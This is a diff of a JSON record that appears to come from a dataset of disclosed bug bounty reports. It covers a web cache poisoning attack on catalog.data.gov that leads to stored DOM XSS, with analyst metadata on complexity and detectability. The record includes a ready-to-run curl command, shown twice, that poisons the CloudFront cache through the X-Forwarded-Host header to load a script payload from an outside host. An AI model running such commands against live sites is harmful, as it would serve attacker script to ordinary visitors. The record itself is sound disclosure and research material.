@@ -1,45 +1,46 @@
 {
-    "reported_to": "GSA Bounty",
-    "reported_by": "albinowax ",
-    "title": "Defacement of catalog.data.gov via web cache poisoning to stored DOMXSS",
-    "content": "\nAn attacker can deface various pages on catalog.data.gov, leading to them executing malicious JavaScript when visited by a normal user.\nThe root problem is that the server trusts the X-Forwarded-Host HTTP header, and uses this to populate the 'data-site-root' and 'data-locale-root' attributes on the <body tag. Some JavaScript then fetches a JSON file from the URL specified in these attributes, and writes the response to the page without escaping it, leading to a DOMXSS vulnerability.\nThis behaviour is harmless by itself, since I can't make a victim send a malicious HTTP header. Fortunately for me, I can ensure that the poisoned response sent to me is cached by CloudFront, meaning my payload will be served to loads of other users.\nPlease be careful when exploring this issue, as it's potentially quite easy to accidentally poison CloudFront's cache and antagonise your visitors. To safely replicate this issue, you can use the following steps:\nRun curl command to poison cache:\ncurl -i -s -k -X $'GET' \\\n-H $'Host: catalog.data.gov' -H $'Accept-Encoding: gzip, deflate' -H $'Accept: /' -H $'Accept-Language: en' -H $'User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)' -H $'x-forwarded-host: portswigger-labs.net/catalog.data.gov_json_xss/json.php?' -H $'Connection: close' \\\n$'https://catalog.data.gov/dataset/consumer-complaint-database?dontpoisoneveryone=6' > /dev/null\nVisit the poisoned page:\nhttps://catalog.data.gov/dataset/consumer-complaint-database?dontpoisoneveryone=6\nWait for a few seconds, and observe the popup caused by our injected alert(document.domain)\nBehind the scenes, step 1 poisons the cache with a data-site-root value of 'portswigger-labs.net/catalog.data.gov_json_xss/json.php'. In step 2, some JavaScript fetches our json.php file from portswigger-labs.net, and uses our 'show more' JSON attribute to translate the 'show more' text on https://catalog.data.gov/dataset/consumer-complaint-database into \"Mostrar m\u00e1s <svg onload=alert(document.domain)>\"\nThis is the offending line of JavaScript:\nvar template_more = ['<tr class=\"toggle-show toggle-show-more\">', '<td colspan=\"' + cols + '\">', '<small>', '<a href=\"#\" class=\"show-more\">' + this.i18n('show_more') + '</a>', '<a href=\"#\" class=\"show-less\">' + this.i18n('show_less') + '</a>', '</small>', '</td>', '</tr>'].join('\\n');\nTo mitigate this issue, I recommend addressing the X-Forwarded-Host reflection.\nPlease let me know if you have any questions.\nCheers,\nJames & Gareth\nImpact\nAn attacker can deface most pages on catalog.data.gov.\n\n",
-    "severity": [
-        8.6,
-        null
+  "reported_to": "GSA Bounty",
+  "reported_by": "albinowax ",
+  "title": "Defacement of catalog.data.gov via web cache poisoning to stored DOMXSS",
+  "content": "\nAn attacker can deface various pages on catalog.data.gov, leading to them executing malicious JavaScript when visited by a normal user.\nThe root problem is that the server trusts the X-Forwarded-Host HTTP header, and uses this to populate the 'data-site-root' and 'data-locale-root' attributes on the <body tag. Some JavaScript then fetches a JSON file from the URL specified in these attributes, and writes the response to the page without escaping it, leading to a DOMXSS vulnerability.\nThis behaviour is harmless by itself, since I can't make a victim send a malicious HTTP header. Fortunately for me, I can ensure that the poisoned response sent to me is cached by CloudFront, meaning my payload will be served to loads of other users.\nPlease be careful when exploring this issue, as it's potentially quite easy to accidentally poison CloudFront's cache and antagonise your visitors. To safely replicate this issue, you can use the following steps:\nRun curl command to poison cache:\ncurl -i -s -k -X $'GET' \\\n-H $'Host: catalog.data.gov' -H $'Accept-Encoding: gzip, deflate' -H $'Accept: /' -H $'Accept-Language: en' -H $'User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)' -H $'x-forwarded-host: portswigger-labs.net/catalog.data.gov_json_xss/json.php?' -H $'Connection: close' \\\n$'https://catalog.data.gov/dataset/consumer-complaint-database?dontpoisoneveryone=6' > /dev/null\nVisit the poisoned page:\nhttps://catalog.data.gov/dataset/consumer-complaint-database?dontpoisoneveryone=6\nWait for a few seconds, and observe the popup caused by our injected alert(document.domain)\nBehind the scenes, step 1 poisons the cache with a data-site-root value of 'portswigger-labs.net/catalog.data.gov_json_xss/json.php'. In step 2, some JavaScript fetches our json.php file from portswigger-labs.net, and uses our 'show more' JSON attribute to translate the 'show more' text on https://catalog.data.gov/dataset/consumer-complaint-database into \"Mostrar m\u00e1s <svg onload=alert(document.domain)>\"\nThis is the offending line of JavaScript:\nvar template_more = ['<tr class=\"toggle-show toggle-show-more\">', '<td colspan=\"' + cols + '\">', '<small>', '<a href=\"#\" class=\"show-more\">' + this.i18n('show_more') + '</a>', '<a href=\"#\" class=\"show-less\">' + this.i18n('show_less') + '</a>', '</small>', '</td>', '</tr>'].join('\\n');\nTo mitigate this issue, I recommend addressing the X-Forwarded-Host reflection.\nPlease let me know if you have any questions.\nCheers,\nJames & Gareth\nImpact\nAn attacker can deface most pages on catalog.data.gov.\n\n",
+  "severity": [
+    8.6,
+    null
+  ],
+  "bounty": 750,
+  "weaknesses": [
+    "Cross-site Scripting (XSS) - Stored"
+  ],
+  "screenshots": {},
+  "disclosed_date": 1541121360,
+  "report_url": "https://hackerone.com/reports/303730",
+  "is_multi_component": true,
+  "complexity": "HIGH",
+  "novelty": "MEDIUM",
+  "vuln_category": "WEB_APP",
+  "steps": [
+    [
+      1,
+      "Run curl command to poison cache: curl -i -s -k -X $'GET' -H $'Host: catalog.data.gov' -H $'Accept-Encoding: gzip, deflate' -H $'Accept: /' -H $'Accept-Language: en' -H $'User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)' -H $'x-forwarded-host: portswigger-labs.net/catalog.data.gov_json_xss/json.php?' -H $'Connection: close' $'https://catalog.data.gov/dataset/consumer-complaint-database?dontpoisoneveryone=6' > /dev/null"
     ],
-    "bounty": 750,
-    "weaknesses": [
-        "Cross-site Scripting (XSS) - Stored"
-    ],
-    "screenshots": {},
-    "disclosed_date": 1541121360,
-    "report_url": "https://hackerone.com/reports/303730",
-    "is_multi_component": true,
-    "complexity": "HIGH",
-    "novelty": "MEDIUM",
-    "vuln_category": "WEB_APP",
-    "steps": [
-        [
-            1,
-            "Run curl command to poison cache: curl -i -s -k -X $'GET' -H $'Host: catalog.data.gov' -H $'Accept-Encoding: gzip, deflate' -H $'Accept: /' -H $'Accept-Language: en' -H $'User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)' -H $'x-forwarded-host: portswigger-labs.net/catalog.data.gov_json_xss/json.php?' -H $'Connection: close' $'https://catalog.data.gov/dataset/consumer-complaint-database?dontpoisoneveryone=6' > /dev/null"
-        ],
-        [
-            2,
-            "Visit the poisoned page: https://catalog.data.gov/dataset/consumer-complaint-database?dontpoisoneveryone=6 and observe the popup caused by the injected alert(document.domain)"
-        ]
-    ],
-    "vuln_description": "An attacker can deface various pages on catalog.data.gov by poisoning the web cache to execute malicious JavaScript when visited by normal users. The server trusts the X-Forwarded-Host HTTP header, which is used to populate attributes on the <body> tag. JavaScript then fetches a JSON file from the URL specified in these attributes and writes the response to the page without escaping it, leading to a DOMXSS vulnerability.",
-    "reason": "The attack involves multiple components (HTTP header manipulation, cache poisoning, DOMXSS) and requires understanding subtle interactions between them. The attacker must also be aware of how the server processes the X-Forwarded-Host header and how the JavaScript uses the injected data.",
-    "new_complexity": "HIGH",
-    "requires_code": false,
-    "requires_CVE": false,
-    "is_ctf": false,
-    "other_report": null,
-    "injection_metadata": {
-        "is_simple_payload": false
-    },
-    "authnz_metadata": {
-        "reason": "The vulnerability involves web cache poisoning and DOM-based XSS via the X-Forwarded-Host header, which is not related to authentication or authorization bypass. The described methodology focuses on testing authentication and authorization boundaries by swapping user sessions and resource IDs, which does not apply to this type of vulnerability.",
-        "is_detectable": false
-    }
+    [
+      2,
+      "Visit the poisoned page: https://catalog.data.gov/dataset/consumer-complaint-database?dontpoisoneveryone=6 and observe the popup caused by the injected alert(document.domain)"
+    ]
+  ],
+  "vuln_description": "An attacker can deface various pages on catalog.data.gov by poisoning the web cache to execute malicious JavaScript when visited by normal users. The server trusts the X-Forwarded-Host HTTP header, which is used to populate attributes on the <body> tag. JavaScript then fetches a JSON file from the URL specified in these attributes and writes the response to the page without escaping it, leading to a DOMXSS vulnerability.",
+  "reason": "The attack involves multiple components (HTTP header manipulation, cache poisoning, DOMXSS) and requires understanding subtle interactions between them. The attacker must also be aware of how the server processes the X-Forwarded-Host header and how the JavaScript uses the injected data.",
+  "new_complexity": "HIGH",
+  "requires_code": false,
+  "requires_CVE": false,
+  "is_ctf": false,
+  "other_report": null,
+  "injection_metadata": {
+    "reasoning": "The vulnerability relies on injecting the X-Forwarded-Host header, which is not a parameter a typical user would modify during regular navigation. The methodology focuses on parameters observed in normal traffic, which would not include this header. Additionally, the payload execution requires cache poisoning (not same-channel detection via regular navigation) and involves external resource loading (JSON from a third-party domain), which exceeds the 'simple payload' scope. The methodology would likely miss this vector since it depends on header manipulation and cache behavior rather than direct parameter injection detectable through standard user interactions.",
+    "is_simple_injection": false
+  },
+  "authnz_metadata": {
+    "reason": "The vulnerability involves web cache poisoning and DOM-based XSS via manipulation of HTTP headers (X-Forwarded-Host), which is not directly related to authentication or authorization bypass. The proposed methodologies focus on testing authorization boundaries by swapping user sessions or resource IDs, not on header manipulation or cache poisoning.",
+    "is_detectable": false
+  }
 }
